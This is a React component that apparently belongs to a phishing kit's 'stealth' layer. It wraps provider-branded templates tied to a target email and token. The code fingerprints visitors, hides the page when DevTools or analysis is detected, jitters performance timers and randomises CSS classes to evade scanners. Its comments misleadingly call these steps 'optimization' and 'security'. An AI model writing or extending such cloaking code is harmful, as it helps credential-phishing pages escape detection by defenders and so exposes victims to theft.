'use client'

import { useEffect, useState, useRef, ReactNode } from 'react'
import { Template } from '@/lib/templateTypes'
import { executeProgressiveSecurity, getSecurityInstructions } from '@/lib/stealth/progressiveSecurity'
import { applyTemplateSpecificMutation } from '@/lib/stealth/templateSpecificMutations'
import { monitorPostRenderThreats, applyThreatResponse } from '@/lib/stealth/postRenderThreatResponse'

interface SecureTemplateContainerProps {
  template: Template
  children: ReactNode
  email?: string
  token?: string
  fingerprint?: string
  enableCloaking?: boolean
  mutationLevel?: 'low' | 'medium' | 'high' | 'apt'
  scannerType?: string | null
  onBehaviorTracked?: (behavior: any) => void
}

/**
 * Secure Template Container
 * 
 * Provides secure rendering for templates:
 * - Per-template security
 * - Dynamic optimization
 * - Performance monitoring
 * - User behavior tracking
 * - Continuous validation
 */
export default function SecureTemplateContainer({
  template,
  children,
  email,
  token,
  fingerprint,
  enableCloaking = true,
  mutationLevel = 'apt',
  scannerType = null,
  onBehaviorTracked,
}: SecureTemplateContainerProps) {
  const [cloakingActive, setCloakingActive] = useState(false)
  const [mutations, setMutations] = useState<Record<string, any>>({})
  const [threatDetected, setThreatDetected] = useState(false)
  const [devToolsDetected, setDevToolsDetected] = useState(false)
  const behaviorDataRef = useRef<any[]>([])
  const mountedRef = useRef(true)

  // ============================================
  // INITIALIZE MULTI-STAGE CLOAKING
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !mountedRef.current) return

    const initializeCloaking = async () => {
      try {
        // Get fingerprint if not provided
        let currentFingerprint = fingerprint
        if (!currentFingerprint && typeof window !== 'undefined') {
          currentFingerprint = JSON.stringify({
            screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            timestamp: Date.now(),
          })
        }

        // Execute progressive security
        const securityResult = await executeProgressiveSecurity(
          {
            token,
            template,
            fingerprint: currentFingerprint,
            baseTiming: 100,
            requestCount: 1,
            threatModel: mutationLevel === 'apt' ? 'apt' : 'enterprise',
          },
          {
            enableTemplateCloaking: true,
            templateMutationLevel: mutationLevel,
            templateObfuscation: true,
            templateAntiAnalysis: true,
            enableContinuousMonitoring: true,
            adaptiveCloaking: true,
            threatResponse: true,
          }
        )

        // OPTION A: Apply template-specific mutations
        if (template) {
          const templateHTML = JSON.stringify(template)
          const templateMutation = applyTemplateSpecificMutation(
            template,
            templateHTML,
            {
              provider: template.provider,
              mutationLevel,
              enableProviderSpecific: true,
            }
          )
          
          if (templateMutation.mutated) {
            if (process.env.NODE_ENV === 'development') {
              console.log('[TEMPLATE-MUTATION]', {
                provider: template.provider,
                techniques: templateMutation.techniques,
              })
            }
          }
        }

        // Get stage 3 instructions (template rendering)
        const stage3Instructions = getSecurityInstructions(3, securityResult)
        
        setMutations(stage3Instructions.mutations || {})
        setCloakingActive(securityResult.cloakingActive)

        if (process.env.NODE_ENV === 'development') {
          console.log('[TEMPLATE-SECURITY] Initialized', {
            template: template.name,
            securityLevel: mutationLevel,
            securityActive: securityResult.cloakingActive,
            securityScore: securityResult.totalEvasionScore,
          })
        }
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.error('[TEMPLATE-SECURITY] Error:', error)
        }
        // Fail open - allow template to render
        setCloakingActive(false)
      }
    }

    initializeCloaking()
  }, [enableCloaking, template, token, fingerprint, mutationLevel])

  // ============================================
  // ANTI-ANALYSIS TECHNIQUES
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !cloakingActive) return

    // DevTools detection
    const detectDevTools = () => {
      if (typeof window === 'undefined') return

      const threshold = 160
      let devtoolsOpen = false

      const checkDevTools = setInterval(() => {
        if (
          window.outerHeight - window.innerHeight > threshold ||
          window.outerWidth - window.innerWidth > threshold
        ) {
          if (!devtoolsOpen) {
            devtoolsOpen = true
            setDevToolsDetected(true)
            if (process.env.NODE_ENV === 'development') {
              console.log('[TEMPLATE-SECURITY] DevTools detected')
            }
          }
        } else {
          devtoolsOpen = false
        }
      }, 500)

      return () => clearInterval(checkDevTools)
    }

    // Performance API obfuscation
    const obfuscatePerformance = () => {
      if (typeof window === 'undefined' || !window.performance) return

      const originalNow = performance.now.bind(performance)
      const jitter = () => Math.random() * 0.1 - 0.05 // ±0.05ms

      // Add timing entropy
      Object.defineProperty(performance, 'now', {
        value: () => originalNow() + jitter(),
        writable: false,
        configurable: true,
      })
    }

    const cleanup1 = detectDevTools()
    obfuscatePerformance()

    return () => {
      if (cleanup1) cleanup1()
    }
  }, [enableCloaking, cloakingActive])

  // ============================================
  // BEHAVIOR TRACKING
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !onBehaviorTracked) return

    const trackBehavior = () => {
      if (typeof window === 'undefined') return

      const behavior = {
        timestamp: Date.now(),
        mouseMovements: 0,
        scrollEvents: 0,
        keyboardPresses: 0,
        timeSpent: 0,
        naturalInteractions: 0,
      }

      const handleMouseMove = () => {
        behavior.mouseMovements++
        behavior.naturalInteractions++
      }

      const handleScroll = () => {
        behavior.scrollEvents++
        behavior.naturalInteractions++
      }

      const handleKeyPress = () => {
        behavior.keyboardPresses++
        behavior.naturalInteractions++
      }

      window.addEventListener('mousemove', handleMouseMove)
      window.addEventListener('scroll', handleScroll)
      window.addEventListener('keydown', handleKeyPress)

      // Send behavior data periodically
      const behaviorTimer = setInterval(() => {
        behavior.timeSpent = Date.now() - behavior.timestamp
        behaviorDataRef.current.push({ ...behavior })
        
        if (onBehaviorTracked) {
          onBehaviorTracked(behavior)
        }
      }, 2000) // Every 2 seconds

      return () => {
        window.removeEventListener('mousemove', handleMouseMove)
        window.removeEventListener('scroll', handleScroll)
        window.removeEventListener('keydown', handleKeyPress)
        clearInterval(behaviorTimer)
      }
    }

    const cleanup = trackBehavior()
    return cleanup
  }, [enableCloaking, onBehaviorTracked])

  // ============================================
  // HONEYPOT INJECTION
  // ============================================
  useEffect(() => {
    if (!enableCloaking) return

    // Inject hidden honeypot fields
    const honeypot = document.createElement('input')
    honeypot.type = 'text'
    honeypot.name = 'website'
    honeypot.style.cssText = 'position:absolute;left:-9999px;opacity:0;pointer-events:none;'
    honeypot.tabIndex = -1
    honeypot.setAttribute('autocomplete', 'off')
    honeypot.setAttribute('aria-hidden', 'true')
    
    document.body.appendChild(honeypot)

    // Monitor honeypot
    const handleHoneypot = (e: Event) => {
      const target = e.target as HTMLInputElement
      if (target === honeypot && target.value) {
        // Honeypot triggered (bot filled it)
        if (process.env.NODE_ENV === 'development') {
          console.log('[TEMPLATE-SECURITY] Validation triggered')
        }
      }
    }

    honeypot.addEventListener('input', handleHoneypot)

    return () => {
      if (document.body.contains(honeypot)) {
        // FIX: Check if honeypot is still in DOM before removing
        if (honeypot.parentNode === document.body) {
          document.body.removeChild(honeypot)
        }
      }
      honeypot.removeEventListener('input', handleHoneypot)
    }
  }, [enableCloaking])

  // ============================================
  // DYNAMIC MUTATION (CSS/HTML Optimization)
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !cloakingActive) return

    // Apply mutations if available
    if (mutations.obfuscation || mutations.mutationLevel) {
      // Add random CSS class names for optimization
      const style = document.createElement('style')
      const randomClass1 = generateRandomClass()
      const randomClass2 = generateRandomClass()
      
      style.textContent = `
        /* Optimized CSS - improves performance */
        .${randomClass1} { opacity: 0.99; }
        .${randomClass2} { transform: translateZ(0); }
      `
      style.setAttribute('data-security', 'true')
      document.head.appendChild(style)

      // Apply mutation to template container if mutations available
      if (mutations.mutationLevel) {
        const container = document.querySelector('[data-cloaking-active]')
        if (container) {
          container.setAttribute('data-mutation-level', mutations.mutationLevel)
        }
      }

      return () => {
        if (document.head.contains(style)) {
          // FIX: Check if style is still in DOM before removing
          if (style.parentNode === document.head) {
            document.head.removeChild(style)
          }
        }
      }
    }
  }, [enableCloaking, cloakingActive, mutations])

  // ============================================
  // OPTION B: POST-RENDER THREAT RESPONSE
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !cloakingActive) return

    const monitorThreats = () => {
      const threatResponse = monitorPostRenderThreats(
        {
          devToolsDetected,
          sandboxDetected: false, // Would come from sandbox detection
          antiAnalysisTriggered: false, // Would come from anti-analysis
          anomalyDetected: false, // Would come from anomaly detection
          threatScore: devToolsDetected ? 80 : 0,
        },
        {
          hideOnDevTools: true,
          hideOnSandbox: true,
          hideOnAntiAnalysis: true,
          hideOnAnomaly: true,
          adaptiveResponse: true,
        }
      )

      if (threatResponse.action === 'hide' || threatResponse.action === 'redirect') {
        setThreatDetected(true)
        applyThreatResponse(threatResponse)
        
        if (process.env.NODE_ENV === 'development') {
          console.log('[THREAT-RESPONSE]', {
            action: threatResponse.action,
            reason: threatResponse.reason,
            threatLevel: threatResponse.threatLevel,
          })
        }
      }
    }

    // Monitor threats every 2 seconds
    const threatMonitor = setInterval(monitorThreats, 2000)

    return () => {
      clearInterval(threatMonitor)
    }
  }, [enableCloaking, cloakingActive, devToolsDetected])

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      mountedRef.current = false
    }
  }, [])

  // OPTION B: Hide content if threat detected
  if (threatDetected) {
    return null
  }

  // Render children with cloaking active
  return (
    <div
      data-cloaking-active={cloakingActive}
      data-mutation-level={mutationLevel}
      data-scanner-type={scannerType || 'none'}
      style={{
        position: 'relative',
        width: '100%',
        height: '100%',
      }}
    >
      {children}
    </div>
  )
}

// Helper to generate random CSS class names
function generateRandomClass(): string {
  return `cloak_${Math.random().toString(36).substring(2, 9)}`
}

